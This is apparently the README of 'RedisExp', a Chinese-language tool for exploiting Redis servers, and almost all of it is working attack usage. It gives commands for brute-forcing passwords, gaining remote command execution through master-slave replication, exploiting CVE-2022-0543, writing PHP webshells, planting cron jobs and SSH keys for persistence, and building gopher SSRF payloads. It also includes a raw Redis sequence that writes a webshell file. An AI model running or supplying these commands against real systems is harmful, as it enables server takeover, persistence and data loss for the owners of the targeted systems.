## Redis 漏洞利用工具


### 声明

**本工具仅用于个人安全研究学习。由于传播、利用本工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，工具作者不为此承担任何责任。**

------

### 注意

**主从复制会清空数据，主从复制会清空数据，主从复制会清空数据，请注意使用！请注意使用！请注意使用！**

------


```

██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝

基本连接: 
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456

爆破 Redis 密码:
RedisExp.exe brute -r 192.168.19.1 -f pass.txt

主从复制执行命令 (默认是交互式 shell)(Redis版本 4.x - 5.x):
RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -c whoami (单次执行)
RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1
RedisExp.exe rce -r 192.168.19.1 -L 127.0.0.1 -f exp.so (Linux)

主从复制文件上传 (windows 中文需要设置gbk)(Redis版本 4.x - 5.x):
RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -d c:\\中文\\ -f shell.php -F shell.txt -g
RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -f shell.php -F shell.txt

Lua沙盒绕过命令执行 CVE-2022-0543:
RedisExp.exe lua -r 192.168.19.6 -c whoami

备份写 Webshell (Windows 中文路径要设置gbk, linux 中文路径不用设置):
RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "<?php phpinfo();?>" -g

Linux 写计划任务:
RedisExp.exe cron -r 192.168.19.1 -L 127.0.0.1 -P 2222

Linux 写 SSH 公钥:
RedisExp.exe ssh -r 192.168.19.1 -u root -s "ssh-rsa AAAAB"

执行 Redis 命令:
RedisExp.exe cli -r 192.168.19.1

生成 gopher ssrf redis payload: 
RedisExp.exe gopher -f 1.txt

```

写文件
```
flushall
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
save
```


1. 具体命令使用 -h 来查看
2. exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。
3. Windows 中文路径需要设置gbk，使用 -g 参数就可以了。



### 报错

```
工具报错：[ERR Error loading the extension. Please check the server logs.]        module load /tmp/exp.so

服务端报错：Module /tmp/exp.so failed to load: It does not have execute permissions.
```

有可能是 Redis 版本太高， exp.so 没有执行权限导致加载不了。具体需要查看服务端的报错



### 参考

本工具基于大量优秀文章和工具才得以~~编写~~ 抄写完成，非常感谢这些无私的分享者！

- https://github.com/zyylhn/redis_rce
- https://github.com/0671/RabR
- https://github.com/r35tart/RedisWriteFile
- https://github.com/toalaska/redis_tool
- https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/
- https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher

 

